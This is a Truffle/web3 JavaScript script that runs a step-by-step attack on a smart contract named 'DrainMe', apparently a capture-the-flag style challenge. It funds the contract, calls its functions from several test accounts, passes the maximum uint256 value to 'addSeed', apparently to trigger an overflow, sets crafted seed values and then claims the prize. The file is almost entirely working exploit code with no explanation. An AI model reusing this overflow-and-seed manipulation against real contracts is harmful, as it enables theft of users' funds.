const DrainMe = artifacts.require("DrainMe")
module.exports = async function(callback) {
  try {
    await web3.eth.getAccounts().then(function (acc){accounts = acc})
    result = []
    instance = await DrainMe.deployed()
    address = await DrainMe.address
    try{
      result[1] = await web3.eth.sendTransaction({to: address, from: accounts[0], value: web3.utils.toWei("0.15")})
    console.log("1")
    console.log(result[1])
    }
    catch(error){
      console.log(error)
    };
    try{
      result[2] = await instance.DranMe({from: accounts[1], value: web3.utils.toWei("0")})
    console.log("2")
    console.log(result[2])
    }
    catch(error){
      console.log(error)
    };
    try{
      result[3] = await instance.DranMe({from: accounts[1], value: web3.utils.toWei("0")})
    console.log("3")
    console.log(result[3])
    }
    catch(error){
      console.log(error)
    };
    try{
      result[4] = await instance.setSecret(web3.utils.toBN("5"), {from: accounts[1], value: web3.utils.toWei("0")})
    console.log("4")
    console.log(result[4])
    }
    catch(error){
      console.log(error)
    };
    try{
      result[5] = await instance.DranMe({from: accounts[2], value: web3.utils.toWei("0")})
    console.log("5")
    console.log(result[5])
    }
    catch(error){
      console.log(error)
    };
    try{
      result[6] = await instance.winPrize({from: accounts[2], value: web3.utils.toWei("0")})
    console.log("6")
    console.log(result[6])
    }
    catch(error){
      console.log(error)
    };
    try{
      result[7] = await instance.becomePlayer({from: accounts[2], value: web3.utils.toWei("0.02")})
    console.log("7")
    console.log(result[7])
    }
    catch(error){
      console.log(error)
    };
    try{
      result[8] = await instance.addSeed(web3.utils.toBN("115792089237316195423570985008687907853269984665640564039457584007913129639935"), {from: accounts[2], value: web3.utils.toWei("0")})
    console.log("8")
    console.log(result[8])
    }
    catch(error){
      console.log(error)
    };
    try{
      result[9] = await instance.setSeed(web3.utils.toBN("40515948540925020973265170959111588746623062155340076979737421334906745207160"), web3.utils.toBN("758865396729135232024679596765701650232053689779"), {from: accounts[2], value: web3.utils.toWei("0")})
    console.log("9")
    console.log(result[9])
    }
    catch(error){
      console.log(error)
    };
    try{
      result[10] = await instance.claimPrize({from: accounts[2], value: web3.utils.toWei("0")})
    console.log("10")
    console.log(result[10])
    }
    catch(error){
      console.log(error)
    };
  }
catch(error) {
console.log(error)
  }
  callback()
}
